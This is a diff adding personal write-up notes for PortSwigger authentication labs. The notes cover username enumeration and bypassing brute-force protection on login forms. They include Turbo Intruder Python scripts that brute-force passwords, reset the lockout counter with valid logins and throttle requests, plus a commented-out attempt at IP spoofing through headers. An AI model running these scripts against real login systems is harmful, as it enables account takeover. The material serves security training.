@@ -371,3 +371,204 @@ this is agreat tell - we can now make the intruder brute-force to **POST /my-acc
 
 # Done
 
+
+# Vulnerabilities in password-based login
+https://portswigger.net/web-security/authentication/password-based
+
+# 1. Lab: Username enumeration via different responses
+https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses
+
+**see solution above**
+
+# 2. Lab: Username enumeration via subtly different responses
+https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses
+
+**see solution above**
+
+# 3. Lab: Username enumeration via response timing
+https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing
+
+**see solution above**
+
+4. Lab: Broken brute-force protection, IP block
+https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block
+
+
+1. login and study login process:
+send baseline requests: valid and invalid combination of username and password:
+observe:
+```htm
+valid pair - 302
+invalid password -\<p class=is-warning>Incorrect password\</p>
+invalid username and invalid pair -\<p class=is-warning>Invalid username\</p>
+```
+so the **incorrect password** message imlies **valid** username
+
+2. with intruder craft a brute force on the username parameters, using the usernames.txt provided by the lab
+```
+POST /login HTTP/1.1
+..
+
+username=§wiener§&password=peter
+```
+observe that after 3 failed attempts IP is locaked.
+lets try to bypass it:
+
+<!-- using ip spoof:
+```
+X-Forwarded-For: 182.15.15.§§ 
+True-Client-IP: 182.15.15.§§
+X-Real-IP: 182.15.15.§§
+```
+didnt work... moving forward -->
+
+lets see if login-in to our own account affect the counter:
+to build an attack that every second attempt will be a valid credential to reset failed attempts timer we will use Turbo Intruder as follow:
+1. if not installed - install Turbo Intruder from BApp and right click the login request and send it to Turbo Intruder
+2. on turbo intruder lets tweek the example/misc.py to this code:
+```python
+#1. define connection parameters:
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint, 
+                           concurrentConnections=1,
+                           requestsPerConnection=1,
+                           pipeline=False,
+                           maxQueueSize=3,
+                           timeout=5,
+                           maxRetriesPerRequest=3,
+                           autoStart=False
+                           )
+    engine.start(timeout=5)
+
+    # 2. reset request:
+    counterreset = """POST /login HTTP/1.1
+Host: 0a9800fc0374620ac05c36b500e8004c.web-security-academy.net
+Content-Length: 30
+
+username=wiener&password=peter"""
+
+    #3. check process:   
+    for word in open('/home/kali/Documents/Portswigger_labs/Broken Authentication /passwords.txt'):
+        engine.queue(target.req, word.rstrip())
+        engine.queue(counterreset)
+
+# 4. filter:
+def handleResponse(req, interesting):
+    if '302' in req.response:
+        table.add(req)
+   
+```
+1. **connection parameters** - after much trial and error i found that using **concurrentConnections=1**,and **requestsPerConnection=1** and limiting the **maxQueueSize=3**
+allows the reset logic to work proprely
+
+2. **reset request**: this will be our "failed-attempts counter-reset request": every successful login resets de facto the counter of failed attempts. 
+
+3. **check process** - the actual iterartion consist of a. password check request followd by b. counter reset request
+
+4. **filter** a successful attempt yeilds 302 response so we will gather all successful responses and look in the payload column for the only raw with payload parameter full (since the rest of the 302 responses are not *payloaded* request)
+
+we login to the account with the dicovered payload
+
+# Done
+
+
+# Lab: Username enumeration via account lock
+https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock
+
+To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page. 
+
+1. enumerate username with Turbo intruder:
+```python
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint, 
+                           concurrentConnections=1,
+                           requestsPerConnection=10,
+                           pipeline=False,
+                           maxQueueSize=10,
+                           timeout=5,
+                           maxRetriesPerRequest=3,
+                           autoStart=False
+                           )
+    engine.start(timeout=5)
+
+    
+    for word in open('/home/kali/Documents/Portswigger_labs/Broken Authentication /usernames.txt'):
+        engine.queue(target.req, word.rstrip())
+        engine.queue(target.req, word.rstrip())
+        engine.queue(target.req, word.rstrip())
+        engine.queue(target.req, word.rstrip())
+        engine.queue(target.req, word.rstrip())
+        
+def handleResponse(req, interesting):
+    if 'xxx' not in req.response:
+        table.add(req)
+
+```
+**observe:**
+on login with credential: **username=as400&password=password**, the 5th try yields response:
+```htm
+                       <p class=is-warning>You have made too many incorrect login attempts. Please try again in 1 minute(s).</p>
+```
+now we know a valid username
+
+2. lets brute force its password- we wil use TI again cause its fun. we prepare a new request with the valid username and the password as the parameter to brute force:
+```
+POST /login HTTP/1.1
+Host: 0a3700400316cd69c028186e00af0049.web-security-academy.net
+Cookie: session=SVGaeqsTwPhuIuCTXbUjuFO5uiAwjE4L
+Content-Length: 32
+
+username=as400&password=%s
+```
+
+lets try **examples/ratelimit.py** (its might be helpfull to avoid the 1 minute pendelty...):
+```python
+# Author: https://github.com/abiwaddell
+# Throttle the attack per-request, and per X requests.
+# Full description at https://github.com/abiwaddell/Run-Pause-Resume
+import time
+
+# Parameters to configure
+triedWords=20
+timeMins=0
+timeSecs=5
+throttleMillisecs=200
+
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=5,
+                           pipeline=False,
+                           engine=Engine.BURP
+                           )
+
+    for i in range(3, 8):
+        engine.queue(target.req, randstr(i), learn=1)
+        engine.queue(target.req, target.baseInput, learn=2)
+
+    secs=timeMins*60+timeSecs
+    n=0
+    for word in open('/home/kali/Documents/Portswigger_labs/Broken Authentication /passwords.txt'):
+        time.sleep(throttleMillisecs/1000)
+        engine.queue(target.req, word.rstrip())
+        n+=1
+        if(n==triedWords):
+            time.sleep(secs)
+            n=0
+
+def handleResponse(req, interesting):
+    if interesting:
+        table.add(req)
+```
+
+ run the example as is to get a baseline - surprisingly we get only 1 response in the table - and its the password! - 
+ 
+ # brute forced!
+
+ 
+ 
+ # 5. Lab: Broken brute-force protection, multiple credentials per request
+ https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request
+
+ To solve the lab, brute-force Carlos's password, then access his account page
+
+ TBC
